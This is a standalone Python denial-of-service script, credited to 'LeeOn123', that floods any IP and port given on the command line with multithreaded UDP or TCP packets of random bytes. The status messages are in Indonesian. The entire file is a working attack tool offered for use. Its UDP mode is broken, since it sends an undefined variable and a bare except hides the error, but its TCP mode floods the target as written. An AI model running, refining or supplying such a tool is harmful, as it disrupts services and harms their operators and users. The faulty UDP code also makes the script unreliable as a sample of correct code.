#!/usr/bin/env python3
#Code by LeeOn123
import argparse
import random
import socket
import threading

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="DDOS", help="UDP(DDOS/n)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
args = vars(ap.parse_args())

print("--> C0de By Lee0n123 <--")
print("#-- TCP/UDP FLOOD --#")
ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def run():
	K_bytes = random._urandom(50055)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Mengirim Packet Torjan✓✓✓")
		except:
			print("[!] Selesai Mengirim Packet Torjan!!!")

def run2():
	K_bytes = random._urandom(50055)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(K_bytes)
			for x in range(times):
				s.send(K_bytes)
			print(i +" Mengirim Packet Torjan✓✓✓")
		except:
			s.close()
			print("[*] Selesai Mengirim Packet Torjan")

for y in range(threads):
	if choice == 'DDOS':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
